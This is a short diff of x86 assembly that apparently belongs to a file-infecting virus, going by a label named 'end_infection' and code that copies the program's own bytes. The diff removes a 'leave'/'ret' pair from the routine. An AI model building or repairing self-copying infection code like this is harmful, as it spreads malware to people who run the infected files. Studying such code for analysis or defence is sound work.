@@ -154,8 +154,6 @@ not_biggest:
 	sub edi, ecx		; Old length
 	mov esi, prog_start
 	rep movsb
-	leave
-	ret
 	
 
 end_infection:
